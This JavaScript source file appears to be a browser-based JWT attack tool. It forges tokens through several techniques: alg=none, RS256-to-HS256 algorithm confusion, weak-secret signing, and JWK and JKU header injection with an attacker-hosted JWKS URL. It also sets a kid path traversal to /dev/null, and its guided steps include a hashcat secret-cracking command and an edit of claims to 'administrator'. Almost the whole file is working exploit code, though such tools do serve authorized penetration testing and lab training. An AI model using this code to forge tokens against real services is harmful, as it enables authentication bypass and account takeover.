const sourceToken = document.getElementById('sourceToken');
const reloadBtn = document.getElementById('reloadBtn');
const decodeError = document.getElementById('decodeError');
const headerOut = document.getElementById('headerOut');
const payloadOut = document.getElementById('payloadOut');
const payloadEditor = document.getElementById('payloadEditor');
const attackInputSection = document.getElementById('attackInputSection');
const extraInputLabel = document.getElementById('extraInputLabel');
const extraInput = document.getElementById('extraInput');
const extraInputHelp = document.getElementById('extraInputHelp');
const jwkTools = document.getElementById('jwkTools');
const jwkAlgSelect = document.getElementById('jwkAlgSelect');
const genJwkAlgKeyBtn = document.getElementById('genJwkAlgKeyBtn');
const embedJwkSignBtn = document.getElementById('embedJwkSignBtn');
const jwkAlgHelp = document.getElementById('jwkAlgHelp');
const jkuTools = document.getElementById('jkuTools');
const jkuKidInput = document.getElementById('jkuKidInput');
const genJkuRsaBtn = document.getElementById('genJkuRsaBtn');
const copyJwksBtn = document.getElementById('copyJwksBtn');
const signJkuBtn = document.getElementById('signJkuBtn');
const jwksOutput = document.getElementById('jwksOutput');
const attackSteps = document.getElementById('attackSteps');
const kidTools = document.getElementById('kidTools');
const kidAlgSelect = document.getElementById('kidAlgSelect');
const generateBtn = document.getElementById('generateBtn');
const resultToken = document.getElementById('resultToken');
const attackNotes = document.getElementById('attackNotes');
const copyBtn = document.getElementById('copyBtn');

let selectedAttack = 'unverified-signature';
let generatedJwkMaterial = null;
let generatedJkuMaterial = null;

sourceToken.value = localStorage.getItem('jwt.source') || '';
if (sourceToken.value) decodeJwt();

reloadBtn.addEventListener('click', decodeJwt);
genJwkAlgKeyBtn.addEventListener('click', generateKeyForJwkAttack);
embedJwkSignBtn.addEventListener('click', () => generateJwkAttackToken(true));
genJkuRsaBtn.addEventListener('click', generateJkuKeyMaterial);
copyJwksBtn.addEventListener('click', copyJwksJson);
signJkuBtn.addEventListener('click', () => generateJwkAttackToken(true));

for (const btn of document.querySelectorAll('[data-attack]')) {
  btn.addEventListener('click', () => {
    selectedAttack = btn.dataset.attack;
    for (const b of document.querySelectorAll('[data-attack]')) b.classList.toggle('secondary', b !== btn);
    configureInputForAttack(selectedAttack);
    attackNotes.textContent = getPresetHint(selectedAttack);
    attackSteps.textContent = getAttackSteps(selectedAttack);
  });
}

configureInputForAttack(selectedAttack);
attackSteps.textContent = getAttackSteps(selectedAttack);

generateBtn.addEventListener('click', async () => {
  await generateJwkAttackToken(false);
});


async function generateJwkAttackToken(forceJwkSign) {
  try {
    decodeError.textContent = '';
    const [headerB64] = mustParseToken(sourceToken.value.trim());
    const baseHeader = parsePart(headerB64);
    const payload = JSON.parse(payloadEditor.value);

    let nextHeader = { ...baseHeader };
    let nextSig = 'tampered-signature';
    let notes = [];

    if (selectedAttack === 'unverified-signature') {
      notes = ['Unverified signature candidate generated.'];
    }

    if (selectedAttack === 'flawed-signature') {
      nextHeader.alg = 'none';
      nextSig = '';
      notes = ['alg=none candidate generated.'];
    }


    if (selectedAttack === 'algorithm-confusion') {
      const keyInput = requireInput('Provide server public key as Base64 PEM or raw PEM text.');
      const keyBytes = await parseAlgorithmConfusionKey(keyInput);
      nextHeader.alg = 'HS256';
      delete nextHeader.jwk;
      delete nextHeader.jku;
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSignBase64urlBytes(signingInput, keyBytes, 'SHA-256');
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = 'Algorithm confusion candidate generated (header alg=HS256; signed with supplied public-key material as HMAC secret).';
      return;
    }

    if (selectedAttack === 'weak-signing-key') {
      const secret = requireInput('Please enter signing key/secret.');
      nextHeader.alg = 'HS256';
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSignBase64url(signingInput, secret, 'SHA-256');
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = `Signed with HS256 and secret: "${secret}".`;
      return;
    }

    if (selectedAttack === 'jwk-header-injection') {
      const alg = jwkAlgSelect.value;
      if (!generatedJwkMaterial || generatedJwkMaterial.alg !== alg) {
        generatedJwkMaterial = await generateKeyMaterialForAlg(alg);
      }

      const publicJwk = minimalPublicJwk(generatedJwkMaterial.publicJwk);
      extraInput.value = JSON.stringify(publicJwk);

      // Keep header minimal for embedded JWK attack.
      delete nextHeader.kid;
      delete nextHeader.jku;
      delete nextHeader.jwk;
      nextHeader.alg = alg;
      nextHeader.jwk = publicJwk;

      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);

      notes = [
        `JWK header injection candidate (${alg}).`,
        'Auto flow: key generated -> public JWK embedded -> token signed automatically.',
      ];
    }

    if (selectedAttack === 'jku-header-injection') {
      const jkuUrl = requireInput('Please provide attacker JWKS URL (jku).');
      if (!generatedJkuMaterial) {
        await generateJkuKeyMaterial();
      }

      const kid = jkuKidInput.value.trim() || generatedJkuMaterial.kid;
      generatedJkuMaterial.kid = kid;
      generatedJkuMaterial.publicJwk.kid = kid;

      nextHeader.alg = 'RS256';
      nextHeader.jku = jkuUrl;
      nextHeader.kid = kid;
      delete nextHeader.jwk;

      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await rsaPkcs1SignBase64url(signingInput, generatedJkuMaterial.privateJwk, 'SHA-256');

      jwksOutput.value = JSON.stringify({ keys: [minimalPublicJwk(generatedJkuMaterial.publicJwk)] }, null, 2);
      notes = [
        'JKU header injection candidate generated.',
        `Signed with generated RSA key and kid=${kid}.`,
        'Host JWKS JSON at your URL and use that URL in jku.',
      ];
    }

    if (selectedAttack === 'kid-path-traversal') {
      const selectedAlg = kidAlgSelect.value;
      nextHeader.alg = selectedAlg;
      nextHeader.kid = '../../../../../../../dev/null';
      delete nextHeader.jku;
      delete nextHeader.jwk;

      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      if (selectedAlg.startsWith('HS')) {
        nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), hashFromAlg(selectedAlg));
      } else {
        const material = await generateKeyMaterialForAlg(selectedAlg);
        nextSig = await signWithMaterial(signingInput, selectedAlg, material);
      }

      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = `Auto-generated kid path traversal JWT (alg=${selectedAlg}, kid=/dev/null traversal).`;
      return;
    }

    resultToken.value = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}.${nextSig}`;
    attackNotes.textContent = notes.join('\n') || 'No notes.';
  } catch (err) {
    decodeError.textContent = `Generation error: ${err.message}`;
  }
}

copyBtn.addEventListener('click', async () => {
  await navigator.clipboard.writeText(resultToken.value);
  attackNotes.textContent += '\nCopied to clipboard.';
});

function configureInputForAttack(key) {
  jwkTools.classList.add('hidden');
  jkuTools.classList.add('hidden');
  kidTools.classList.add('hidden');
  extraInput.classList.remove('hidden');
  extraInputLabel.classList.remove('hidden');
  extraInputHelp.classList.remove('hidden');

  if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');

  if (key === 'algorithm-confusion') return showInput('JWKS / key input', '{"keys":[{...RSA JWK...}]}', 'Paste full JWKS JSON, single JWK JSON, Base64 PEM, or raw PEM. Tool will derive HS256 secret and sign automatically.');

  if (key === 'jwk-header-injection') {
    showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject. Generate key by selected alg below.');
    jwkTools.classList.remove('hidden');
    return;
  }

  if (key === 'jku-header-injection') {
    showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required attacker-controlled JWKS URL where jwks.json is hosted.');
    jkuTools.classList.remove('hidden');
    return;
  }
  if (key === 'kid-path-traversal') {
    attackInputSection.classList.remove('hidden');
    kidTools.classList.remove('hidden');
    extraInput.classList.add('hidden');
    extraInputLabel.classList.add('hidden');
    extraInputHelp.classList.add('hidden');
    extraInput.value = '';
    return;
  }

  attackInputSection.classList.add('hidden');
  extraInput.value = '';
}

function showInput(label, placeholder, helpText) {
  attackInputSection.classList.remove('hidden');
  extraInputLabel.textContent = label;
  extraInput.placeholder = placeholder;
  extraInputHelp.textContent = helpText;
}

function requireInput(message) {
  const value = extraInput.value;
  if (value === '') throw new Error(message);
  return value;
}

function readJsonInput(example, errorMessage) {
  const raw = requireInput(errorMessage);
  try { return JSON.parse(raw); } catch { throw new Error(`Invalid JSON input. Example: ${example}`); }
}


async function generateJkuKeyMaterial() {
  generatedJkuMaterial = await generateKeyMaterialForAlg('RS256');
  generatedJkuMaterial.kid = crypto.randomUUID();
  generatedJkuMaterial.publicJwk.kid = generatedJkuMaterial.kid;
  jkuKidInput.value = generatedJkuMaterial.kid;
  jwksOutput.value = JSON.stringify({ keys: [minimalPublicJwk(generatedJkuMaterial.publicJwk)] }, null, 2);
  attackNotes.textContent = 'Generated RSA key for JKU attack and prepared JWKS JSON.';
}

async function copyJwksJson() {
  if (!jwksOutput.value) await generateJkuKeyMaterial();
  await navigator.clipboard.writeText(jwksOutput.value);
  attackNotes.textContent = 'JWKS JSON copied to clipboard.';
}

function getAttackSteps(key) {
  if (key === 'jku-header-injection') {
    return [
      '1) Paste source JWT and click Decode token.',
      '2) Edit payload as needed for your test case.',
      '3) In Attack-specific input paste your JWKS URL (jku).',
      '4) Click Generate RSA key for JKU to create key + kid + JWKS JSON.',
      '5) Click Copy JWKS JSON and upload it to your server at that URL.',
      '6) Click Sign JKU token now (or Generate) to sign JWT with generated private key.',
      '7) Send request with generated token and validate behavior.',
    ].join('\n');
  }

  if (key === 'jwk-header-injection') {
    return [
      '1) Paste source JWT and click Decode token.',
      '2) Edit payload as needed for your test case.',
      '3) Choose algorithm and click Generate key for selected alg.',
      '4) Click Embed JWK & Sign token.',
      '5) Send request with generated token and validate behavior.',
    ].join('\n');
  }

  if (key === 'algorithm-confusion') {
    return [
      '1) Obtain server JWKS (for example from /jwks.json).',
      '2) Paste full JWKS JSON (or single JWK/PEM) into Attack-specific input.',
      '3) Edit payload claims as needed (for example sub=administrator).',
      '4) Click Generate. Tool converts key material and signs HS256 automatically.',
      '5) Send request with generated token and validate behavior.',
    ].join('\n');
  }

  if (key === 'weak-signing-key') {
    return [
      '1) Paste source JWT and click Decode token.',
      '2) Edit payload as needed for your test case.',
      '3) Try cracking the secret using Hashcat:',
      '   hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list',
      '4) Put cracked secret into Signing key input and click Generate.',
      '5) Send request with generated token and validate behavior.',
    ].join('\n');
  }

  if (key === 'kid-path-traversal') {
    return [
      '1) Paste source JWT and click Decode token.',
      '2) Optionally edit payload for your test case.',
      '3) Choose signing algorithm in Attack-specific input.',
      '4) Tool sets kid to ../../../../../../../dev/null automatically.',
      '5) Click Generate and test generated token.',
    ].join('\n');
  }

  return 'Select an attack to see guided steps.';
}

function getPresetHint(key) {
  const hints = {
    'unverified-signature': 'Generates token with invalid signature.',
    'flawed-signature': 'Generates alg=none token with empty signature.',
    'algorithm-confusion': 'Uses public-key material as HS256 secret.',
    'weak-signing-key': 'Requires user-provided secret.',
    'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
    'jku-header-injection': 'Requires jku URL.',
    'kid-path-traversal': 'Choose algorithm and click Generate.',
  };
  return hints[key] || 'Choose preset and generate.';
}

async function generateKeyForJwkAttack() {
  try {
    const alg = jwkAlgSelect.value;
    generatedJwkMaterial = await generateKeyMaterialForAlg(alg);
    extraInput.value = JSON.stringify(minimalPublicJwk(generatedJwkMaterial.publicJwk));
    jwkAlgHelp.textContent = `Generated key material for ${alg}. Ready to embed/sign.`;
  } catch (err) {
    decodeError.textContent = `JWK key generation error: ${err.message}`;
  }
}

async function generateKeyPairForAlg(alg) {
  if (alg.startsWith('RS')) {
    return crypto.subtle.generateKey(
      { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: hashFromAlg(alg) },
      true,
      ['sign', 'verify'],
    );
  }
  if (alg.startsWith('PS')) {
    return crypto.subtle.generateKey(
      { name: 'RSA-PSS', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: hashFromAlg(alg) },
      true,
      ['sign', 'verify'],
    );
  }
  if (alg.startsWith('ES')) {
    return crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: curveFromEsAlg(alg) }, true, ['sign', 'verify']);
  }
  if (alg === 'EdDSA') {
    return crypto.subtle.generateKey({ name: 'Ed25519' }, true, ['sign', 'verify']);
  }
  throw new Error(`Unsupported algorithm: ${alg}`);
}


async function generateKeyMaterialForAlg(alg) {
  if (alg.startsWith('HS')) {
    const secret = randomSecret(32);
    return { alg, secret, publicJwk: { kty: 'oct', k: utf8ToBase64url(secret) } };
  }

  const pair = await generateKeyPairForAlg(alg);
  const publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
  const privateJwk = await crypto.subtle.exportKey('jwk', pair.privateKey);
  return { alg, publicJwk, privateJwk };
}

function minimalPublicJwk(jwk) {
  if (!jwk || !jwk.kty) throw new Error('Invalid JWK');
  if (jwk.kty === 'RSA') return { kty: 'RSA', n: jwk.n, e: jwk.e, ...(jwk.kid ? { kid: jwk.kid } : {}) };
  if (jwk.kty === 'EC') return { kty: 'EC', crv: jwk.crv, x: jwk.x, y: jwk.y, ...(jwk.kid ? { kid: jwk.kid } : {}) };
  if (jwk.kty === 'OKP') return { kty: 'OKP', crv: jwk.crv, x: jwk.x, ...(jwk.kid ? { kid: jwk.kid } : {}) };
  if (jwk.kty === 'oct') return { kty: 'oct', k: jwk.k, ...(jwk.kid ? { kid: jwk.kid } : {}) };
  return jwk;
}
async function signWithMaterial(signingInput, alg, material) {
  if (alg.startsWith('HS')) return hmacSignBase64url(signingInput, material.secret, hashFromAlg(alg));
  if (alg.startsWith('RS')) return rsaPkcs1SignBase64url(signingInput, material.privateJwk, hashFromAlg(alg));
  if (alg.startsWith('PS')) return rsaPssSignBase64url(signingInput, material.privateJwk, hashFromAlg(alg), saltLenFromHash(hashFromAlg(alg)));
  if (alg.startsWith('ES')) return ecdsaSignBase64url(signingInput, material.privateJwk, hashFromAlg(alg));
  if (alg === 'EdDSA') return eddsaSignBase64url(signingInput, material.privateJwk);
  throw new Error(`Unsupported sign algorithm: ${alg}`);
}

function mustParseToken(token) {
  const parts = token.split('.');
  if (parts.length !== 3) throw new Error('JWT must have 3 parts.');
  return parts;
}

function hashFromAlg(alg) {
  if (alg.endsWith('256')) return 'SHA-256';
  if (alg.endsWith('384')) return 'SHA-384';
  if (alg.endsWith('512')) return 'SHA-512';
  if (alg === 'EdDSA') return 'SHA-512';
  return 'SHA-256';
}

function curveFromEsAlg(alg) {
  if (alg === 'ES256') return 'P-256';
  if (alg === 'ES384') return 'P-384';
  if (alg === 'ES512') return 'P-521';
  throw new Error(`Unsupported ES algorithm: ${alg}`);
}

function saltLenFromHash(hash) {
  if (hash === 'SHA-256') return 32;
  if (hash === 'SHA-384') return 48;
  return 64;
}

function isSameJwk(a, b) {
  if (!a || !b || a.kty !== b.kty) return false;
  if (a.kty === 'oct') return a.k === b.k;
  if (a.kty === 'RSA') return a.n === b.n && a.e === b.e;
  if (a.kty === 'EC' || a.kty === 'OKP') return a.x === b.x && a.y === b.y && a.crv === b.crv;
  return false;
}

function decodeJwt() {
  decodeError.textContent = '';
  try {
    const [headerB64, payloadB64] = mustParseToken(sourceToken.value.trim());
    const header = parsePart(headerB64);
    const payload = parsePart(payloadB64);
    headerOut.textContent = JSON.stringify(header, null, 2);
    payloadOut.textContent = JSON.stringify(payload, null, 2);
    payloadEditor.value = JSON.stringify(payload, null, 2);
    localStorage.setItem('jwt.source', sourceToken.value.trim());
  } catch (err) {
    decodeError.textContent = `Decode error: ${err.message}`;
  }
}

function parsePart(part) {
  const json = atob(base64urlToBase64(part));
  return JSON.parse(json);
}

function base64urlJson(obj) {
  return base64ToBase64url(btoa(JSON.stringify(obj)));
}

function base64urlToBase64(input) {
  const pad = '='.repeat((4 - (input.length % 4 || 4)) % 4);
  return (input + pad).replace(/-/g, '+').replace(/_/g, '/');
}

function base64ToBase64url(input) {
  return input.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

function utf8ToBase64url(text) {
  const bytes = new TextEncoder().encode(text);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return base64ToBase64url(btoa(binary));
}

function randomSecret(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let out = '';
  const rnd = crypto.getRandomValues(new Uint8Array(length));
  for (const v of rnd) out += chars[v % chars.length];
  return out;
}



async function parseAlgorithmConfusionKey(input) {
  const value = input.trim();

  if (value.startsWith('{')) {
    const parsed = JSON.parse(value);
    const jwk = parsed.keys ? parsed.keys[0] : parsed;
    if (!jwk || jwk.kty !== 'RSA') throw new Error('Algorithm confusion currently expects RSA JWK input.');

    const key = await crypto.subtle.importKey(
      'jwk',
      jwk,
      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
      true,
      ['verify'],
    );
    const spki = await crypto.subtle.exportKey('spki', key);
    const pem = spkiToPem(spki);
    return new TextEncoder().encode(pem);
  }

  if (value.includes('BEGIN PUBLIC KEY') || value.includes('BEGIN RSA PUBLIC KEY')) {
    return new TextEncoder().encode(value);
  }

  return base64ToBytes(value);
}

function spkiToPem(spkiBuffer) {
  const bytes = new Uint8Array(spkiBuffer);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  const b64 = btoa(binary).match(/.{1,64}/g).join('\n');
  return `-----BEGIN PUBLIC KEY-----
${b64}
-----END PUBLIC KEY-----`;
}

function base64ToBytes(b64) {
  const normalized = base64urlToBase64(b64);
  const binary = atob(normalized);
  const out = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) out[i] = binary.charCodeAt(i);
  return out;
}

async function hmacSignBase64urlBytes(message, keyBytes, hash) {
  const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash }, false, ['sign']);
  const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(message));
  return arrayBufferToBase64url(signature);
}

async function hmacSignBase64url(message, secret, hash) {
  return hmacSignBase64urlBytes(message, new TextEncoder().encode(secret), hash);
}

async function rsaPkcs1SignBase64url(message, privateJwk, hash) {
  const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'RSASSA-PKCS1-v1_5', hash }, false, ['sign']);
  const signature = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', key, new TextEncoder().encode(message));
  return arrayBufferToBase64url(signature);
}

async function rsaPssSignBase64url(message, privateJwk, hash, saltLength) {
  const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'RSA-PSS', hash }, false, ['sign']);
  const signature = await crypto.subtle.sign({ name: 'RSA-PSS', saltLength }, key, new TextEncoder().encode(message));
  return arrayBufferToBase64url(signature);
}

async function ecdsaSignBase64url(message, privateJwk, hash) {
  const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'ECDSA', namedCurve: privateJwk.crv }, false, ['sign']);
  const der = await crypto.subtle.sign({ name: 'ECDSA', hash }, key, new TextEncoder().encode(message));
  const jose = derToJose(new Uint8Array(der), privateJwk.crv);
  return arrayBufferToBase64url(jose.buffer);
}

async function eddsaSignBase64url(message, privateJwk) {
  const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'Ed25519' }, false, ['sign']);
  const signature = await crypto.subtle.sign('Ed25519', key, new TextEncoder().encode(message));
  return arrayBufferToBase64url(signature);
}


function derToJose(derSig, crv) {
  const partLen = crv === 'P-256' ? 32 : crv === 'P-384' ? 48 : 66;
  if (derSig[0] !== 0x30) throw new Error('Invalid DER signature format');
  let offset = 2;
  if (derSig[offset] !== 0x02) throw new Error('Invalid DER signature format');
  const rLen = derSig[offset + 1];
  let r = derSig.slice(offset + 2, offset + 2 + rLen);
  offset = offset + 2 + rLen;
  if (derSig[offset] !== 0x02) throw new Error('Invalid DER signature format');
  const sLen = derSig[offset + 1];
  let ss = derSig.slice(offset + 2, offset + 2 + sLen);

  if (r[0] === 0x00 && r.length > partLen) r = r.slice(1);
  if (ss[0] === 0x00 && ss.length > partLen) ss = ss.slice(1);

  const out = new Uint8Array(partLen * 2);
  out.set(r.slice(Math.max(0, r.length - partLen)), partLen - Math.min(partLen, r.length));
  out.set(ss.slice(Math.max(0, ss.length - partLen)), partLen * 2 - Math.min(partLen, ss.length));
  return out;
}

function arrayBufferToBase64url(buffer) {
  const bytes = new Uint8Array(buffer);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return base64ToBase64url(btoa(binary));
}
